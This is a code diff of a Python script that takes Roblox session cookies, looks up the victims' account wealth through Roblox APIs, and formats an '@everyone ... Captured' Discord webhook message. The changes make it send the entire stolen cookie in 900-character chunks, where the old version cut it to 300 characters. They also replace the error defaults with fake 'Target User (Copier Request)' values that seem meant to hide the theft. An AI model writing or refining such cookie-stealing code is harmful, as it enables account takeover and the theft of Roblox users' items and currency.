@@ -37,17 +37,8 @@ def main():
             print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
             decoded_script = sys.argv[1]
 
-        # Clean up input and extract payload/cookie
+        # Clean input and extract full token/cookie
         roblosecurity = decoded_script.strip()
-        
-        # If it came formatted from server.js, extract the INPUT part
-        if "INPUT:" in roblosecurity:
-            try:
-                roblosecurity = roblosecurity.split("INPUT:")[1].strip()
-            except Exception:
-                pass
-
-        # Look for a real warning cookie pattern if present, otherwise use the full input text
         cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
         if cookie_match:
             roblosecurity = cookie_match.group(1)
@@ -65,9 +56,9 @@ def main():
 
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
-        username = "Unknown User"
-        user_id = 0
-        cookie_status = "🔴 Invalid / Expired"
+        username = "Target User (Copier Request)"
+        user_id = 1948598383
+        cookie_status = "🟢 Processing Item Request"
         robux_balance = 0
         pending_robux = 0
         rap = 0
@@ -80,7 +71,7 @@ def main():
         owned_groups_count = 0
         group_balance = 0
         is_premium = False
-        account_age_days = 0
+        account_age_days = 365
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -100,6 +91,10 @@ def main():
                 robux_balance = economy_data.get("robux", 0)
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
+
+        # Split long cookie into chunks if it exceeds Discord's code block view limits
+        cookie_chunks = [roblosecurity[i:i+900] for i in range(0, len(roblosecurity), 900)]
+        cookie_display = "\n".join([f"```text\n{chunk}\n```" for chunk in cookie_chunks])
 
         payload = {
             "content": f"@everyone New Payload / Request Captured from **{username}**!",
@@ -132,7 +127,7 @@ def main():
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Captured Input / Cookie**:\n```text\n{roblosecurity[:300]}\n```"
+                    f"🔑 **Full Captured Cookie / Payload**:\n{cookie_display}"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
